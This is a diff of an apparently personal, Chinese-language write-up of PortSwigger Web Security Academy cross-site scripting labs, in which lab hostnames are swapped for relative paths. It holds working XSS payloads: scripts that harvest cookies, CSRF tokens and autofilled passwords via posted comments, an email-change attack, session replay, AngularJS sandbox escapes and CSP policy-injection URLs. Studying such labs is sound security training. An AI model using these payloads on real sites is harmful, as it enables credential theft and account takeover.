@@ -414,7 +414,7 @@ encodeURIComponent(`<body onresize="print()"></body>`)
 <!-- prettier-ignore -->
 ```js
 encodeURIComponent(`<di onfocus="alert(document.cookie)" tabindex=0 autofocus></di>`)
-https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E
+// /?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E
 ```
 
 之後在 exploit-server 的 response body 輸入
@@ -666,20 +666,14 @@ var message = `0 search results for '${alert(document.domain)}'`;
   addEventListener("DOMContentLoaded", () => {
     const csrf = document.querySelector("input[name='csrf']").value;
     const cookie = document.cookie;
-    fetch(
-      "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post/comment",
-      {
-        headers: {
-          "content-type": "application/x-www-form-urlencoded",
-        },
-        referrer:
-          "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post?postId=2",
-        body: `csrf=${csrf}&postId=5&comment=${cookie}&name=${new Date().getTime()}&email=789%40789&website=`,
-        method: "POST",
-        mode: "cors",
-        credentials: "include",
+    fetch(`${location.origin}/post/comment`, {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
       },
-    );
+      body: `csrf=${csrf}&postId=5&comment=${cookie}&name=${new Date().getTime()}&email=789%40789&website=`,
+      method: "POST",
+      credentials: "include",
+    });
   });
 </script>
 ```
@@ -696,9 +690,7 @@ session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m
 
 ```js
 document.cookie = "session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m";
-fetch(
-  "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/my-account",
-);
+fetch(`${location.origin}/my-account`);
 ```
 
 ## Lab: Exploiting cross-site scripting to capture passwords
@@ -745,18 +737,14 @@ fetch(
     ).value;
     const csrf = document.querySelector("input[name='csrf']").value;
     const cookie = document.cookie;
-    fetch(
-      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
-      {
-        headers: {
-          "content-type": "application/x-www-form-urlencoded",
-        },
-        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
-        method: "POST",
-        mode: "cors",
-        credentials: "include",
+    fetch(`${location.origin}/post/comment`, {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
       },
-    );
+      body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+      method: "POST",
+      credentials: "include",
+    });
   }
 </script>
 <iframe
@@ -780,18 +768,14 @@ fetch(
       ).value;
       const csrf = document.querySelector("input[name='csrf']").value;
       const cookie = document.cookie;
-      fetch(
-        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
-        {
-          headers: {
-            "content-type": "application/x-www-form-urlencoded",
-          },
-          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
-          method: "POST",
-          mode: "cors",
-          credentials: "include",
+      fetch(`${location.origin}/post/comment`, {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
         },
-      );
+        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+        method: "POST",
+        credentials: "include",
+      });
     });
   }
 </script>
@@ -807,10 +791,7 @@ fetch(
 ```html
 <script>
   addEventListener("DOMContentLoaded", () => {
-    const loginWindow = window.open(
-      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/login",
-      "_blank",
-    );
+    const loginWindow = window.open(`${location.origin}/login`, "_blank");
     loginWindow.addEventListener("DOMContentLoaded", () => {
       const username = loginWindow.document.querySelector(
         "input[name='username']",
@@ -820,18 +801,14 @@ fetch(
       ).value;
       const csrf = document.querySelector("input[name='csrf']").value;
       const cookie = document.cookie;
-      fetch(
-        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
-        {
-          headers: {
-            "content-type": "application/x-www-form-urlencoded",
-          },
-          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
-          method: "POST",
-          mode: "cors",
-          credentials: "include",
+      fetch(`${location.origin}/post/comment`, {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
         },
-      );
+        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+        method: "POST",
+        credentials: "include",
+      });
     });
   });
 </script>
@@ -846,18 +823,14 @@ fetch(
     const password = document.querySelector("input[name='password']").value;
     const csrf = document.querySelector("input[name='csrf']").value;
     const cookie = document.cookie;
-    fetch(
-      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
-      {
-        headers: {
-          "content-type": "application/x-www-form-urlencoded",
-        },
-        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
-        method: "POST",
-        mode: "cors",
-        credentials: "include",
+    fetch(`${location.origin}/post/comment`, {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
       },
-    );
+      body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+      method: "POST",
+      credentials: "include",
+    });
   }
 </script>
 <input type="username" name="username" />
@@ -888,18 +861,14 @@ fetch(
 <script>
   addEventListener("DOMContentLoaded", () => {
     const csrf = document.querySelector("input[name='csrf']").value;
-    fetch(
-      "https://0a7800ad0434f44480a6945e0099000d.web-security-academy.net/my-account/change-email",
-      {
-        headers: {
-          "content-type": "application/x-www-form-urlencoded",
-        },
-        body: `email=hacked${new Date().toISOString()}%40normal-user.net&csrf=${csrf}`,
-        method: "POST",
-        mode: "cors",
-        credentials: "include",
+    fetch(`${location.origin}/my-account/change-email`, {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
       },
-    );
+      body: `email=hacked${new Date().toISOString()}%40normal-user.net&csrf=${csrf}`,
+      method: "POST",
+      credentials: "include",
+    });
   });
 </script>
 ```
@@ -942,7 +911,7 @@ angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
 
 <!-- prettier-ignore -->
 ```
-https://0a8e00220480a2e880200325008600b8.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
 ```
 
 這題我測出來的限制是
@@ -1228,12 +1197,12 @@ test();
 <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
 ```
 
-想像上 `https://0a6b009f032d58a280cf0da400440021.web-security-academy.net/post?postId=1` 到這邊都是必備的
+想像上 `/post?postId=1` 到這邊都是必備的
 
 這題也是妖魔鬼怪，看了答案也是看不懂的那種
 
 ```
-https://0a6b009f032d58a280cf0da400440021.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 ```
 
 會產生以下 html
@@ -1254,14 +1223,14 @@ https://0a6b009f032d58a280cf0da400440021.web-security-academy.net/post?postId=5&
 | Document  | https://portswigger.net/web-security/cross-site-scripting/dangling-markup#what-is-dangling-markup-injection<br/>https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack                                                                                                  |
 
-首先找到注入點在 email，構造 `https://0ae3008003f8b14f82331a680010000c.web-security-academy.net/my-account?email=123`，會產生以下 html
+首先找到注入點在 email，構造 `/my-account?email=123`，會產生以下 html
 
 <!-- prettier-ignore -->
 ```html
 <input required type="email" name="email" value="123">
 ```
 
-嘗試關閉標籤，構造 `https://0ae3008003f8b14f82331a680010000c.web-security-academy.net/my-account?email=123"/><img src="https://www.google.com`，會產生以下 html
+嘗試關閉標籤，構造 `/my-account?email=123"/><img src="https://www.google.com`，會產生以下 html
 
 <!-- prettier-ignore -->
 ```html
@@ -1319,7 +1288,7 @@ Refused to execute inline script because it violates the following Content Secur
 後來看了 [Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)，我覺得這題一定跟這個有關，於是嘗試
 
 ```
-https://0a98004004c30aae80f921b300df004e.web-security-academy.net/?token=123
+/?token=123
 ```
 
 成功讓 CSP 變成
@@ -1332,7 +1301,7 @@ content-security-policy: default-src 'self'; object-src 'none';script-src 'self'
 
 <!-- prettier-ignore -->
 ```
-https://0a98004004c30aae80f921b300df004e.web-security-academy.net/?token=123;%20script-src-attr%20%27unsafe-inline%27&search=%3Cinput%20autofocus%20onfocus=alert(1)%20/%3E
+/?token=123;%20script-src-attr%20%27unsafe-inline%27&search=%3Cinput%20autofocus%20onfocus=alert(1)%20/%3E
 ```
 
 這題算是 expert 當中蠻簡單的題目XD
